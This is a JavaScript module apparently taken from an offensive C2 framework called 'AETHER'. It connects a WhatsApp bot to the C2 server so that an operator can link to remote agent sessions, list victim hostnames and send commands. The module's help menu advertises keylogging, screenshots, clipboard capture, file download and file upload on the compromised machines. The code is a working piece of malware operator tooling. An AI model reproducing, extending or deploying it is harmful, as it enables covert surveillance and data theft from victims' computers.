/**
 * AETHER C2 WhatsApp Bot Bridge
 * Integrates Baileys WhatsApp bot with AETHER C2 framework
 * 
 * This module handles command routing between WhatsApp and AETHER
 */

import fetch from 'node-fetch';

class AETHERBridge {
    constructor(config = {}) {
        this.aetherHost = config.aetherHost || 'http://localhost:5000';
        this.aetherPort = config.aetherPort || 5000;
        this.apiKey = config.apiKey || '';
        this.authorizedUsers = new Set(config.authorizedUsers || []);
        this.userSessions = new Map();
        this.commandTimeout = config.commandTimeout || 30000;
        
        console.log('[AETHER] Bridge initialized');
        console.log(`  Host: ${this.aetherHost}:${this.aetherPort}`);
        console.log(`  Authorized Users: ${this.authorizedUsers.size}`);
    }

    /**
     * Check if user is authorized
     */
    isAuthorized(userId) {
        return this.authorizedUsers.has(userId);
    }

    /**
     * Add authorized user
     */
    authorizeUser(userId) {
        this.authorizedUsers.add(userId);
        console.log(`[AETHER] Authorized user: ${userId}`);
    }

    /**
     * Revoke user access
     */
    revokeUser(userId) {
        this.authorizedUsers.delete(userId);
        this.userSessions.delete(userId);
        console.log(`[AETHER] Revoked user: ${userId}`);
    }

    /**
     * Link user to AETHER session
     */
    linkSession(userId, sessionId) {
        this.userSessions.set(userId, sessionId);
        console.log(`[AETHER] Linked ${userId} to session ${sessionId}`);
    }

    /**
     * Get user's linked session
     */
    getUserSession(userId) {
        return this.userSessions.get(userId);
    }

    /**
     * Send command to AETHER server
     */
    async sendCommand(userId, command) {
        if (!this.isAuthorized(userId)) {
            return {
                status: 'error',
                message: '❌ Unauthorized access',
            };
        }

        const sessionId = this.getUserSession(userId);
        if (!sessionId) {
            return {
                status: 'error',
                message: '❌ No session linked. Use: link <session_id>',
            };
        }

        try {
            const response = await fetch(
                `${this.aetherHost}:${this.aetherPort}/api/command`,
                {
                    method: 'POST',
                    timeout: this.commandTimeout,
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${this.apiKey}`,
                    },
                    body: JSON.stringify({
                        session_id: sessionId,
                        command: command,
                        user: userId,
                        timestamp: new Date().toISOString(),
                    }),
                }
            );

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            const result = await response.json();
            return {
                status: 'success',
                result: result,
            };
        } catch (error) {
            console.error(`[AETHER] Command error: ${error.message}`);
            return {
                status: 'error',
                message: `❌ Command failed: ${error.message}`,
            };
        }
    }

    /**
     * Get list of active sessions
     */
    async getSessions(userId) {
        if (!this.isAuthorized(userId)) {
            return '❌ Unauthorized';
        }

        try {
            const response = await fetch(`${this.aetherHost}:${this.aetherPort}/api/sessions`, {
                headers: { 'Authorization': `Bearer ${this.apiKey}` },
                timeout: 10000,
            });

            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }

            const data = await response.json();
            const sessions = data.sessions || [];
            
            if (sessions.length === 0) {
                return 'No active sessions';
            }

            return '📋 Active Sessions:\n' + 
                sessions.slice(0, 10).map(s => 
                    `• ${s.id}: ${s.hostname}`
                ).join('\n');
        } catch (error) {
            return `❌ Failed to fetch sessions: ${error.message}`;
        }
    }

    /**
     * Get help menu
     */
    getHelpMenu(isAuthorized = false) {
        if (!isAuthorized) {
            return `🤖 AETHER WhatsApp Control

To get started:
  *auth <password>*

Ask admin for password!`;
        }

        return `🤖 AETHER WhatsApp Control

📋 *Session Commands:*
  link <session_id>  - Link to agent
  unlink            - Unlink from agent
  sessions          - List all sessions
  status            - Current session info

🎯 *System Commands (after link):*
  whoami            - Current user
  hostname          - System name
  ps                - List processes
  screenshot        - Take screenshot
  keylog start      - Start keylogger
  keylog stop       - Stop keylogger
  clipboard         - Get clipboard
  
💾 *File Commands:*
  ls <path>         - List directory
  cat <file>        - Read file
  cd <path>         - Change directory
  download <file>   - Download file
  upload <file>     - Upload file

📚 *Help:*
  help              - Show this menu
  history           - Command history

Type commands as messages!`;
    }
}

export default AETHERBridge;
